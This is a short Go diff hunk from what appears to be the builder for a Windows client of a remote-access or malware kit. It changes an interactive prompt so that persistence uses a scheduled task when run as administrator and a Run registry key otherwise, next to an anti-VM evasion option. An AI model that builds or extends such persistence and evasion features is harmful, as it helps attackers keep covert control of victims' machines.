@@ -181,7 +181,7 @@ func buildClientWindows() error {
 	antiVM := strings.TrimSpace(antiVMInput) == "y"
 
 	// Get persistence preference
-	fmt.Print("Enable persistence (Run key)? (y/n): ")
+	fmt.Print("Enable persistence (if ran as administrator scheduled task, if not runkey)? (y/n): ")
 	persistenceInput, _ := reader.ReadString('\n')
 	persistence := strings.TrimSpace(persistenceInput) == "y"
 
